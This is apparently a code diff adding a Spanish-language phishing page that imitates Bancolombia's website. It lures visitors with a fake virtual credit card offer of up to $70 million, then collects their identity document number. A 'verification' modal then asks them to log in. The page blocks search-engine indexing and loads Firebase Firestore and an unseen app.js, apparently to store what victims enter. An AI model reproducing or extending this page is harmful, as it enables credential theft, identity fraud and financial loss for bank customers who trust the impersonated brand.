@@ -1,0 +1,360 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="description" content="Proyecto web con Tailwind CSS">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="googlebot" content="noindex, nosnippet">
+  <title>Bancolombia - Tarjeta Virtual</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        fontFamily: {
+          inter: ["Inter", "sans-serif"],
+          manrope: ["Manrope", "sans-serif"]
+        }
+      }
+    };
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="assets/styles/main.css">
+  <script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-analytics.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-firestore.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+</head>
+<body class="min-h-screen bg-white font-inter text-[#1f2937]">
+
+  <div id="landing-page">
+    <header class="border-b border-black/5 bg-white">
+      <div class="mx-auto flex h-12 max-w-[1280px] items-center justify-between px-4 text-[11px] font-semibold text-[#2d2d2d] md:hidden">
+        <div class="flex items-center gap-1.5">
+          <img src="assets/images/logo-horizontal.svg" alt="Bancolombia" class="h-[14px] w-auto">
+        </div>
+        <div class="flex items-center gap-1.5 font-medium">
+          <i class="fas fa-bars text-[13px]"></i>
+          <span>Menú</span>
+        </div>
+      </div>
+      <div class="mx-auto hidden h-12 max-w-[1280px] items-center justify-center px-4 text-[10px] font-semibold text-[#2d2d2d] md:flex">
+        <img src="assets/images/logo-horizontal.svg" alt="Bancolombia" class="h-[14px] w-auto">
+      </div>
+    </header>
+
+    <section class="bg-white px-4 pb-3 pt-6 md:bg-gradient-to-r md:from-[#5db9cc] md:to-[#9fd8e1] md:px-0 md:pt-[2.6rem] md:pb-0">
+      <div class="mx-auto max-w-[1280px] md:grid md:max-w-[760px] md:grid-cols-[240px_300px] md:items-stretch md:justify-center md:gap-3 lg:max-w-[820px] lg:grid-cols-[260px_340px] lg:py-1">
+        <div class="mx-auto max-w-[320px] md:max-w-[260px] md:self-start">
+          <h1 class="font-manrope text-[34px] font-black leading-[1.02] text-[#111827] md:max-w-[240px] md:text-[22px] md:text-[#111827] lg:text-[24px]">
+            Tarjeta de crédito Virtual Mastercard Bancolombia
+          </h1>
+          <p class="mt-4 text-[14px] font-semibold leading-6 text-[#111827] md:mt-3 md:max-w-[220px] md:text-[10px] md:leading-4 md:text-[#111827] lg:max-w-[240px] lg:text-[11px]">
+            Obtén tu Tarjeta de crédito Virtual con un cupo de hasta <strong>$70.000.000</strong> <strong>Exclusivo para usuarios Bancolombia</strong>.
+          </p>
+          <div class="mt-5 rounded-xl bg-white px-4 py-3 text-[9px] leading-4 text-[#4b5563] shadow-[0_2px_10px_rgba(0,0,0,0.05)] md:hidden">
+            ¿Te hicimos las cuentas? En seis meses podrías ahorrar hasta $760.000 solo por usar tu tarjeta. Suma Puntos Colombia, agrega descuentos y usa los seguros a tu favor.
+          </div>
+        </div>
+        <div class="mx-auto mt-6 w-[250px] md:mt-0 md:flex md:w-auto md:flex-col md:items-end md:self-stretch">
+          <div class="hidden w-[360px] items-start gap-2 rounded-xl border border-black/10 bg-white px-4 py-3 text-[9px] leading-4 text-[#111827] shadow-[0_8px_24px_rgba(0,0,0,0.12)] md:flex">
+            <div class="mt-[1px] flex h-5 w-5 items-center justify-center overflow-hidden rounded border border-[#d1d5db] bg-white">
+              <img src="assets/images/rallitas-doradas.png" alt="" class="h-5 w-5 object-contain">
+            </div>
+            <div>
+              <span class="font-bold">¿Te hicimos las cuentas?</span> En seis meses podrías ahorrar hasta <span class="font-bold">$760.000</span> solo por usar tu tarjeta. Suma Puntos Colombia, agrega descuentos y usa los seguros a tu favor.
+            </div>
+          </div>
+          <div class="cc-hero__card relative mt-4 h-[165px] w-[250px] md:mt-auto md:h-auto md:w-auto">
+            <div class="absolute left-[6px] top-0 z-10 hidden bg-transparent px-0 py-0 text-[6px] leading-[1.2] text-[#111827] md:block lg:left-[10px] lg:text-[7px]">
+              Compra facil y segura
+            </div>
+            <img src="assets/images/postal-grande.png" alt="Tarjeta virtual Bancolombia" class="cc-hero__image absolute bottom-0 right-0 z-10 h-auto w-[250px] md:w-full">
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <div class="bg-[#f3f4f6]">
+      <main class="mx-auto max-w-[920px] px-4 pb-4 pt-2 md:px-5 md:pb-5 md:pt-3">
+        <section class="mx-auto w-full max-w-[380px] md:max-w-[380px] lg:max-w-[420px] md:rounded-lg md:bg-white md:px-4 md:py-3">
+          <div class="rounded-2xl bg-[#f3f4f6] px-4 py-5 md:rounded-none md:bg-transparent md:px-0 md:py-0">
+            <div class="flex items-start gap-3 md:items-center md:gap-2">
+              <span class="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-[#ffd400] text-[16px] text-black md:h-4 md:w-4 md:rounded md:text-[8px]">
+                <i class="fas fa-credit-card"></i>
+              </span>
+              <div>
+                <p class="font-manrope text-[14px] font-semibold text-[#1f2937] md:text-[10px] md:font-medium md:text-[#4b5563]">
+                  Escoge tu cupo ideal
+                </p>
+                <p class="mt-1 text-[11px] leading-4 text-[#6b7280] md:hidden">
+                  Selecciona el cupo que mejor se adapte a tus necesidades
+                </p>
+              </div>
+            </div>
+            <div class="mt-6 text-center md:mt-4">
+              <p class="text-[11px] text-[#6b7280] md:hidden">Cupo seleccionado</p>
+              <p id="selected-amount" class="font-manrope mt-2 text-[22px] font-semibold text-[#262626] md:mt-0 md:text-[24px]">$12.000.000</p>
+              <p id="selected-label" class="mt-2 text-[10px] text-[#6b7280] md:mt-1 md:text-[8px]">
+                Cupo seleccionado para tu solicitud
+              </p>
+            </div>
+            <div class="mt-6 md:mt-4">
+              <div class="relative h-6">
+                <div class="absolute inset-x-0 top-1/2 h-[4px] -translate-y-1/2 rounded-full bg-[#d1d5db]"></div>
+                <div id="slider-progress" class="absolute left-0 top-1/2 h-[4px] w-[12.5%] -translate-y-1/2 rounded-full bg-[#ffd400]"></div>
+                <input id="cupo-slider" class="cupo-slider absolute inset-0 z-10 h-6 w-full cursor-pointer appearance-none bg-transparent" type="range" min="4" max="70" step="1" value="12" aria-label="Seleccionar cupo ideal">
+              </div>
+              <div class="mt-2 flex justify-between text-[9px] text-[#6b7280] md:mt-1 md:text-[7px] md:text-[#9ca3af]">
+                <span>$ 5.000.000</span>
+                <span>$ 70.000.000</span>
+              </div>
+            </div>
+          </div>
+          <div class="mt-5 space-y-2 rounded-xl bg-[#f8fafc] p-3 md:mt-4 md:rounded-lg">
+            <div class="flex items-start gap-2 text-[9px] text-[#4b5563] md:text-[8px]">
+              <i class="fas fa-check-circle mt-[1px] text-[10px] text-[#22c55e] md:text-[9px]"></i>
+              <span>Sin cuota de manejo el primer año</span>
+            </div>
+            <div class="flex items-start gap-2 text-[9px] text-[#4b5563] md:text-[8px]">
+              <i class="fas fa-check-circle mt-[1px] text-[10px] text-[#22c55e] md:text-[9px]"></i>
+              <span>Aprobación digital inmediata</span>
+            </div>
+            <div class="flex items-start gap-2 text-[9px] text-[#4b5563] md:text-[8px]">
+              <i class="fas fa-check-circle mt-[1px] text-[10px] text-[#22c55e] md:text-[9px]"></i>
+              <span>Hasta 2% de cashback en compras</span>
+            </div>
+          </div>
+          <div class="mt-3 flex items-start gap-2 rounded-xl bg-[#f2f3f5] px-3 py-3 text-[8px] leading-4 text-[#6b7280] md:mt-2 md:text-[7px]">
+            <i class="far fa-clock mt-[1px] text-[10px] text-[#9ca3af] md:text-[9px]"></i>
+            <span>El cupo se asigna sin intereses mensuales. Aplica sujeto a evaluación crediticia.</span>
+          </div>
+          <button id="apply-button" type="button" class="mx-auto mt-5 flex items-center justify-center gap-2 rounded-full bg-[#ffd400] px-6 py-2.5 text-[8px] font-bold uppercase tracking-wide text-black transition hover:brightness-95 focus:outline-none focus:ring-2 focus:ring-[#20304a]/20 md:mt-4 md:px-5 md:py-2 md:text-[7px]">
+            <span>Solicitar tarjeta</span>
+            <i class="fas fa-arrow-right text-[10px] md:text-[9px]"></i>
+          </button>
+        </section>
+
+        <section class="mx-auto mt-8 grid max-w-[560px] grid-cols-2 gap-x-8 gap-y-10 text-center text-[#374151] md:mt-6 md:grid-cols-4 md:gap-x-6 md:gap-y-6">
+          <article>
+            <div class="mx-auto flex h-8 w-8 items-center justify-center rounded-full border border-[#d1d5db] bg-white text-[11px] text-[#111827] md:h-6 md:w-6 md:text-[9px]">
+              <i class="fas fa-birthday-cake text-[13px] md:text-[10px]"></i>
+            </div>
+            <p class="mt-2 text-[10px] font-bold text-[#374151] md:text-[6px]">Edad entre</p>
+            <p class="font-manrope mt-2 text-[28px] font-black leading-none tracking-tight text-[#111827] md:text-[16px]">18 y 84 años</p>
+          </article>
+          <article>
+            <div class="mx-auto flex h-8 w-8 items-center justify-center rounded-full border border-[#d1d5db] bg-white text-[11px] text-[#111827] md:h-6 md:w-6 md:text-[9px]">
+              <i class="far fa-credit-card text-[13px] md:text-[10px]"></i>
+            </div>
+            <p class="mt-2 text-[10px] font-bold text-[#374151] md:text-[6px]">Cuota de manejo</p>
+            <p class="font-manrope mt-2 text-[28px] font-black leading-none tracking-tight text-[#111827] md:text-[16px]">5 meses a $0*</p>
+          </article>
+          <article>
+            <div class="mx-auto flex h-8 w-8 items-center justify-center rounded-full border border-[#d1d5db] bg-white text-[11px] text-[#111827] md:h-6 md:w-6 md:text-[9px]">
+              <i class="fas fa-coins text-[13px] md:text-[10px]"></i>
+            </div>
+            <p class="mt-2 text-[10px] font-bold text-[#374151] md:text-[6px]">Cupo de hasta</p>
+            <p class="font-manrope mt-2 text-[28px] font-black leading-none tracking-tight text-[#111827] md:text-[16px]">$70 millones</p>
+          </article>
+          <article>
+            <div class="mx-auto flex h-8 w-8 items-center justify-center rounded-full border border-[#d1d5db] bg-white text-[11px] text-[#111827] md:h-6 md:w-6 md:text-[9px]">
+              <i class="far fa-star text-[13px] md:text-[10px]"></i>
+            </div>
+            <p class="mt-2 text-[10px] font-bold text-[#374151] md:text-[6px]">Por cada $3.800</p>
+            <p class="font-manrope mt-2 text-[28px] font-black leading-none tracking-tight text-[#111827] md:text-[16px]">6 Puntos <span class="block">Colombia</span></p>
+          </article>
+        </section>
+
+        <p class="mx-auto mt-4 max-w-[560px] text-center text-[7px] font-semibold leading-3 text-[#374151] md:mt-2 md:text-[7px]">
+          *5 meses a $0 de cuota de manejo si solicitas la tarjeta por internet. Después, $50.960 mensuales.
+        </p>
+
+        <section class="mx-auto mt-8 max-w-[430px] md:mt-6 md:flex md:max-w-[920px] md:items-center md:justify-center">
+          <div class="flex items-center justify-between gap-2 md:hidden">
+            <button id="benefit-prev" type="button" class="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[#ffd400] text-[#1f2937]" aria-label="Beneficio anterior">
+              <i class="fas fa-arrow-left text-[10px]"></i>
+            </button>
+            <article class="flex flex-1 items-start gap-3 rounded-xl px-1 py-1 text-left">
+              <div class="mt-1 flex h-10 w-10 items-center justify-center">
+                <img id="benefit-icon-1-mobile-image" src="assets/images/icono-caja.svg" alt="" class="h-10 w-10 object-contain">
+                <i id="benefit-icon-1-mobile" class="hidden text-[22px]"></i>
+              </div>
+              <div>
+                <p id="benefit-title-1-mobile" class="font-manrope text-[15px] font-black leading-5 text-[#111827]">Casillero virtual</p>
+                <p id="benefit-text-1-mobile" class="mt-1 text-[7px] leading-4 text-[#374151]">Compra por Internet en Estados Unidos y recibe tus articulos en Colombia.</p>
+              </div>
+            </article>
+            <button id="benefit-next" type="button" class="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[#ffd400] text-[#1f2937]" aria-label="Siguiente beneficio">
+              <i class="fas fa-arrow-right text-[10px]"></i>
+            </button>
+          </div>
+
+          <div class="hidden items-center justify-center gap-8 md:flex">
+            <button id="benefit-prev-desktop" type="button" class="flex h-10 w-10 items-center justify-center rounded-full bg-[#ffd400] text-[#1f2937]" aria-label="Beneficio anterior">
+              <i class="fas fa-arrow-left text-[12px]"></i>
+            </button>
+            <div class="relative grid grid-cols-2 gap-x-20">
+              <div class="pointer-events-none absolute left-1/2 top-4 h-[calc(100%-2rem)] w-px -translate-x-1/2 bg-[#e5e7eb]"></div>
+              <article class="flex w-[340px] items-start gap-4 bg-transparent px-0 py-0 text-left shadow-none">
+                <div class="mt-0.5 flex h-12 w-12 items-center justify-center">
+                  <img id="benefit-icon-1-image" src="assets/images/icono-caja.svg" alt="" class="h-12 w-12 object-contain">
+                  <i id="benefit-icon-1" class="hidden"></i>
+                </div>
+                <div class="max-w-[250px]">
+                  <p id="benefit-title-1" class="font-manrope text-[18px] font-bold leading-5 text-[#111827]">Casillero virtual</p>
+                  <p id="benefit-text-1" class="mt-2 text-[13px] leading-5 text-[#374151]">Compra por Internet en Estados Unidos y recibe tus articulos en Colombia.</p>
+                </div>
+              </article>
+              <article class="flex w-[340px] items-start gap-4 bg-transparent px-0 py-0 text-left shadow-none">
+                <div class="mt-0.5 flex h-12 w-12 items-center justify-center">
+                  <img id="benefit-icon-2-image" src="assets/images/diamantito.svg" alt="" class="h-12 w-12 object-contain">
+                  <i id="benefit-icon-2" class="hidden"></i>
+                </div>
+                <div class="max-w-[250px]">
+                  <p id="benefit-title-2" class="font-manrope text-[18px] font-bold leading-5 text-[#111827]">Salas VIP Avianca</p>
+                  <p id="benefit-text-2" class="mt-2 text-[13px] leading-5 text-[#374151]">Presenta tu tarjeta de credito y accede a las salas VIP de Avianca en Colombia</p>
+                </div>
+              </article>
+            </div>
+            <button id="benefit-next-desktop" type="button" class="flex h-10 w-10 items-center justify-center rounded-full bg-[#ffd400] text-[#1f2937]" aria-label="Siguiente beneficio">
+              <i class="fas fa-arrow-right text-[12px]"></i>
+            </button>
+          </div>
+        </section>
+
+        <div class="mt-4 flex items-center justify-center gap-2 md:mt-3">
+          <button type="button" class="carousel-dot h-1.5 w-5 rounded-full bg-[#ffd400] transition" data-slide="0" aria-label="Ver beneficios 1"></button>
+          <button type="button" class="carousel-dot h-1.5 w-5 rounded-full bg-[#111827] opacity-70 transition" data-slide="1" aria-label="Ver beneficios 2"></button>
+          <button type="button" class="carousel-dot h-1.5 w-5 rounded-full bg-[#111827] opacity-70 transition" data-slide="2" aria-label="Ver beneficios 3"></button>
+          <button type="button" class="carousel-dot h-1.5 w-5 rounded-full bg-[#111827] opacity-70 transition" data-slide="3" aria-label="Ver beneficios 4"></button>
+        </div>
+      </main>
+    </div>
+
+    <footer class="relative mt-2 overflow-hidden border-t border-black/5 bg-white pb-0 md:mt-3 md:bg-white md:pb-0">
+      <div class="relative z-10 mx-auto flex max-w-[1280px] items-end justify-between px-4 pb-0 pt-2 text-[9px] text-[#4b5563] md:h-8 md:px-2 md:py-0 md:text-[8px]">
+        <div>
+          <div class="flex items-center gap-2">
+            <img src="assets/images/logo-horizontal.svg" alt="Bancolombia" class="h-[14px] w-auto">
+          </div>
+          <div class="mt-0.5 text-[8px] md:hidden">Copyright © 2026 Bancolombia.</div>
+          <div class="mt-1 flex items-center gap-[3px] md:hidden">
+            <span class="rounded border border-[#d1d5db] bg-white px-1 py-[1px] text-[6px] font-bold tracking-[0.12em] text-[#6b7280]"> VIGILADO </span>
+            <img src="assets/images/pegatina-sonrisa.svg" alt="" class="h-[7px] w-auto translate-y-[0.5px]">
+          </div>
+          <div class="mt-0.5 hidden items-center gap-3 text-[8px] text-[#4b5563] md:flex">
+            <span>Copyright © 2026 Bancolombia.</span>
+            <div class="flex items-center gap-[3px]">
+              <span class="rounded border border-[#d1d5db] bg-white px-1 py-[1px] text-[6px] font-bold tracking-[0.12em] text-[#6b7280]"> VIGILADO </span>
+              <img src="assets/images/pegatina-sonrisa.svg" alt="" class="h-[7px] w-auto translate-y-[0.5px]">
+            </div>
+          </div>
+        </div>
+        <div class="flex items-end gap-1 -mr-4 md:mr-0">
+          <img src="assets/images/pie-trazo-movil.svg" alt="" class="w-[144px] max-w-none h-auto md:hidden">
+        </div>
+      </div>
+      <img src="assets/images/pie-trazo-escritorio.svg" alt="" class="pointer-events-none absolute bottom-0 right-0 hidden h-[180px] w-[3000px] max-w-none select-none object-contain md:block">
+    </footer>
+  </div>
+
+  <div id="post-solicitud-page" class="fixed inset-0 z-[55] hidden bg-[#efefef] text-[#111827]">
+    <header class="flex h-12 items-center bg-[#2c2a29] px-3 text-white">
+      <button id="post-solicitud-back" type="button" class="flex w-[72px] items-center gap-1 text-[12px] font-medium">
+        <i class="fas fa-chevron-left text-[12px]"></i>
+        <span>Volver</span>
+      </button>
+      <div class="flex flex-1 justify-center">
+        <img src="assets/images/logo-horizontal.svg" alt="Bancolombia" class="h-[12px] w-auto" style="filter:invert(1) brightness(2)">
+      </div>
+      <div class="w-[72px]"></div>
+    </header>
+    <main class="mx-auto w-full max-w-[430px] px-4 pt-4 pb-44">
+      <h2 class="font-manrope text-[16px] font-extrabold text-[#111827]">
+        ¡Todo listo! Empecemos con tu numero de documento
+      </h2>
+      <div class="mt-4">
+        <p class="text-[10px] font-semibold text-[#6b7280]">Tipo de documento de identidad</p>
+        <button id="document-type-trigger" type="button" class="mt-2 flex w-full items-center justify-between border-b border-black/20 bg-transparent px-1 py-3 text-[12px] text-[#111827]">
+          <span class="flex items-center gap-2">
+            <i class="far fa-id-card text-[#6b7280]"></i>
+            <span id="document-type-value" class="text-[12px]">Cédula de Ciudadanía</span>
+          </span>
+          <i id="document-type-chevron" class="fas fa-chevron-down text-[#6b7280] transition-transform duration-200"></i>
+        </button>
+        <div id="document-type-options" class="hidden border-b border-black/20 bg-transparent pb-1">
+          <button type="button" class="document-type-option flex w-full items-center gap-2 px-1 py-2 text-left text-[12px] text-[#111827]" data-value="Cédula de Ciudadanía">
+            <i class="far fa-id-card text-[#6b7280]"></i>
+            <span>Cédula de Ciudadanía</span>
+          </button>
+          <button type="button" class="document-type-option flex w-full items-center gap-2 px-1 py-2 text-left text-[12px] text-[#111827]" data-value="Cédula de extranjería">
+            <i class="far fa-id-card text-[#6b7280]"></i>
+            <span>Cédula de extranjería</span>
+          </button>
+          <button type="button" class="document-type-option flex w-full items-center gap-2 px-1 py-2 text-left text-[12px] text-[#111827]" data-value="Tarjeta de identidad">
+            <i class="far fa-id-card text-[#6b7280]"></i>
+            <span>Tarjeta de identidad</span>
+          </button>
+        </div>
+      </div>
+      <div class="mt-4">
+        <p class="text-[10px] font-semibold text-[#6b7280]">Numero de documento</p>
+        <div class="mt-2 flex items-center gap-2 border-b border-black/20 bg-transparent px-1 py-3">
+          <i class="far fa-id-badge text-[#6b7280]"></i>
+          <input id="document-number-input" inputmode="numeric" class="w-full bg-transparent text-[12px] text-[#111827] outline-none placeholder:text-[#9ca3af]" placeholder="Ingresa tu número de documento">
+        </div>
+      </div>
+      <div class="mt-4 flex items-start gap-2 text-[10px] leading-4 text-[#374151]">
+        <input type="checkbox" checked="checked" class="mt-[2px] h-4 w-4 accent-[#ffd400]">
+        <span> Autorizo a Bancolombia para que el numero de celular y el correo electronico, sean tratados para contactarme y me enviar informacion relacionada con la solicitud del producto. Igualmente para que me consulten ante Operadores de Informacion y Riesgo con el fin de verificar mi informacion personal. Terminos, Condiciones y Politicas de Privacidad para la solicitud de productos. </span>
+      </div>
+      <div class="mt-4 rounded-lg bg-[#f8fafc] p-3 text-[10px] leading-4 text-[#4b5563]">
+        <span class="font-semibold">Si tienes otro tipo de documento, acércate a la oficina mas cercana para solicitar tu producto.</span>
+      </div>
+    </main>
+    <div class="fixed bottom-0 left-0 right-0 z-[56] bg-[#2c2a29] px-4 pb-4 pt-3">
+      <div class="text-center">
+        <img src="assets/images/logo-horizontal.svg" alt="Bancolombia" class="mx-auto h-[12px] w-auto" style="filter:invert(1) brightness(2)">
+        <div class="mt-1 text-[9px] text-white/70">Copyright © 2026 Bancolombia S.A.</div>
+      </div>
+      <button id="post-solicitud-next" type="button" disabled="disabled" class="mt-4 w-full rounded-full bg-[#9ca3af] py-3 text-[12px] font-bold text-white opacity-70 transition">
+        Siguiente
+      </button>
+    </div>
+  </div>
+
+  <div id="identity-verification-modal" class="fixed inset-0 z-[58] hidden items-center justify-center bg-black/35 backdrop-blur-sm px-3">
+    <div class="w-full max-w-[344px] rounded-[16px] bg-white px-5 pb-5 pt-6 text-center shadow-[0_24px_50px_rgba(0,0,0,0.30)]">
+      <img src="assets/images/foto-whatsapp-sonrie.jpg" alt="" class="mx-auto h-[86px] w-[86px] object-contain">
+      <h3 class="mt-4 font-manrope text-[17px] font-extrabold text-[#2c2a29]">
+        Verificación de identidad
+      </h3>
+      <p class="mx-auto mt-2 max-w-[278px] text-[12px] leading-5 text-[#4b5563]">
+        Con el fin de resguardar tu solicitud y prevenir casos de suplantación de identidad, por favor inicia sesión para completar este proceso de verificación de forma segura.
+      </p>
+      <button id="identity-verification-continue" type="button" class="mx-auto mt-6 block w-full max-w-[182px] rounded-full bg-[#ffd400] py-3 text-[13px] font-bold text-[#2c2a29]">
+        Continuar
+      </button>
+    </div>
+  </div>
+
+  <div id="loading-overlay" class="fixed inset-0 z-[60] hidden items-center justify-center bg-black/40 backdrop-blur-sm" role="dialog" aria-modal="true" aria-label="Cargando">
+    <div class="relative flex h-[140px] w-[140px] flex-col items-center justify-center rounded-full bg-white shadow-[0_20px_40px_rgba(0,0,0,0.25)]">
+      <div class="h-8 w-8 animate-spin rounded-full border-2 border-[#d1d5db] border-t-[#6b7280]"></div>
+      <div id="loading-text" class="mt-3 text-center text-[12px] font-medium text-[#374151]">Cargando...</div>
+    </div>
+  </div>
+
+  <div id="action-toast" class="pointer-events-none fixed bottom-5 right-5 translate-y-3 rounded-2xl bg-[#111827] px-4 py-3 text-sm text-white opacity-0 shadow-xl transition duration-300">
+    Solicitud enviada correctamente.
+  </div>
+
+  <script type="module" src="assets/js/core/app.js"></script>
+</body>
+</html>
